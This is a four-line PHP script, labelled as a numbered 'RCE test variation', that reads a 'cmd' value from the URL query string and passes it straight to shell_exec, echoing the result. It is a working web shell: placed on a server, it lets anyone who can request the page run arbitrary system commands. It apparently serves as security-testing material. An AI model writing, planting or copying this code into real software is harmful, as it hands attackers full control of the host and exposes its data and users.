<?php
// RCE test variation #397
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>